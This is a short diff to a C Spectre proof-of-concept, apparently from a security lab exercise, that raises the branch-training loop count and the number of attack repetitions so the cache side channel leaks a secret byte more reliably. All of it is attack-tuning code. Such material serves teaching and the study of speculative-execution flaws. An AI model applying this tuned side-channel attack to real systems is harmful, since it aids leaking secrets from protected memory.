@@ -60,7 +60,7 @@ void spectreAttack(size_t larger_x) {
     }
 
     // Train the CPU to always take the true branch inside restrictedAccess()
-    for (j = 0; j < 10; j++) {
+    for (j = 0; j < 100; j++) {
         _mm_clflush(&buffer_size);
         restrictedAccess(j);
     }
@@ -114,7 +114,7 @@ int main() {
 
         // This runs the attack multiple times to improve the likely-hood of a hit, keep track of hits
         // for each ascii value from 0 to 255, the maximum number of hits will give us the secret byte
-        for (i = 0; i < 2000; i++) {
+        for (i = 0; i < 10000; i++) {
             spectreAttack(larger_x);
             reloadSideChannel(scores);
         }
